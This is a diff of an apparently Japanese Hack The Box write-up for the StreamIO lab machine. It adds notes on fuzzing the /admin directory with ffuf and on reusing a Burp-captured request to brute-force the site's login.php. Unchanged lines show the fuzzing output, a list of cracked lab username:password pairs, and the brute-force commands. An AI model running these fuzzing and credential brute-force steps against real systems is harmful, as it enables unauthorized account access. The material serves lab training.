@@ -99,6 +99,7 @@ IMAGES                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration
 Fonts                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 316ms]
 :: Progress: [29999/29999] :: Job [1/1] :: 118 req/sec :: Duration: [0:03:40] :: Errors: 1 ::
 ```
+admin配下にもアクセス拒否されるファイルを確認
 ```sh
 └─$ ffuf -u https://streamio.htb/admin/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt 
 
@@ -128,6 +129,7 @@ Index.php               [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 29
 master.php              [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 329ms]
 :: Progress: [17129/17129] :: Job [1/1] :: 137 req/sec :: Duration: [0:02:02] :: Errors: 0 ::
 ```
+
 
 ## STEP 3
 サブドメインにアクセス  
@@ -346,7 +348,7 @@ Thane:highschoolmusical
 Victoria:!5psycho8!
 yoshihide:66boysandgirls..
 ```
-とういうことでブルートフォース攻撃
+とういうことでstep2で見つけたlogin.phpにブルートフォース攻撃
 ```sh
 └─$ curl -d "username=admin&password=admin" -k -s https://streamio.htb/login.php | grep 'Login failed'
         <div class="alert alert-danger">Login failed</div>
@@ -355,7 +357,9 @@ yoshihide:66boysandgirls..
 
 └─$ cat vaild.txt | awk -F ':' {'print $2'} > pass.txt
 ```
-ffufでブルートフォース攻撃
+ffufのデフォルトのhttpsリクエストヘッダでは、うまくログインリクエストが処理されていなかったので  
+ブラウザ上でのhttpsリクエストをburpでキャプチャし、ffufで再利用  
+ログイン成功するクレデンシャルを発見した
 ```sh
 └─$ ffuf -request request -w users.txt:userFUZZ -w pass.txt:passFUZZ -fr 'Login failed'
 
